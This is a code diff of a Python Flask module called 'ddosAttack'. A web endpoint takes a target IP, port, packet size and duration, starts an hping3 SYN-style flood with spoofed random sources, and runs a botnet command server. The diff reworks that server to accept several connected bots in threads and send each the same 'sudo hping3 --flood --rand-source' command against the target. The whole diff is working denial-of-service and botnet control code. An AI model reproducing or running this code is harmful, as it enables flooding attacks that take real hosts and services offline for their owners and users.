@@ -8,7 +8,7 @@ import threading
 ddosAttack = Blueprint("ddosAttack", __name__, url_prefix="/ddosAttack")
 
 @ddosAttack.post("/")
-def SYNFloodAttack():
+def DDOSAttack():
     data = request.get_json()
     ipAddress = data["ipAddress"]
     portNumber = data["portNumber"]
@@ -17,7 +17,7 @@ def SYNFloodAttack():
     duration = int(data["duration"])
 
     # launch dos on bots using a seperate thread
-    bots = threading.Thread(target=botnet, args=(data))
+    bots = threading.Thread(target=botnet, args=(ipAddress, portNumber, packetSize, attackType, duration))
     bots.start()
 
     dosCommand = subprocess.Popen(
@@ -51,14 +51,7 @@ def checkLatency():
     else:
         return '[PING FAILED] ' + line
     
-#1
-def send_commands(conn, data):
-    ipAddress = data["ipAddress"]
-    portNumber = data["portNumber"]
-    packetSize = data["packetSize"]
-    attackType = data["attackType"]
-    duration = int(data["duration"])
-
+def send_commands(conn, ipAddress, portNumber, packetSize, attackType, duration):
     command = "sudo hping3 {attackType} -d {packetSize} --flood --rand-source -p {portNumber} {ipAddress}"
     cmd = command.format(
         attackType=attackType,
@@ -72,10 +65,10 @@ def send_commands(conn, data):
         print(client_response, end="")
 
 
-def botnet(data):
-    hostname=socket.gethostname()   
-    bindIp=socket.gethostbyname(hostname)   
-    bindIp = "192.168.1.34"
+def botnet(ipAddress, portNumber, packetSize, attackType, duration):
+    # hostname=socket.gethostname()   
+    # bindIp=socket.gethostbyname(hostname)   
+    bindIp="192.168.6.22"
     bindPort = 1046
     servAdd = (bindIp, bindPort)
     
@@ -85,10 +78,28 @@ def botnet(data):
     server.listen(5)
     print ("[*] listening on {}:{}".format(bindIp, bindPort))
 
-    conn,addr = server.accept()
+    max_connections = 2  # Maximum number of concurrent connections
+
+    threads = [] # Create a list to keep track of threads
+
+    start_time = time.time()  # Record the start time
+
+    while (time.time() - start_time) < duration:
+        conn, addr = server.accept() # accept the connection
+        
+        # Create a new thread to handle the connection
+        client_thread = threading.Thread(target=handle_client, args=(conn, addr, ipAddress, portNumber, packetSize, attackType, duration))
+        client_thread.start()
+        
+        threads.append(client_thread) # Store the thread in the list
+
+    # Wait for all threads to finish
+    for thread in threads:
+        thread.join()
+
+
+def handle_client(conn, addr, ipAddress, portNumber, packetSize, attackType, duration):
+    # Handle the connection
     print('accepted connection from {} and port {}'.format(addr[0], addr[1]))
-    print("enter the commands below")
-    
-    # execute command
-    send_commands(conn, data)
+    send_commands(conn, ipAddress, portNumber, packetSize, attackType, duration)
     conn.close()
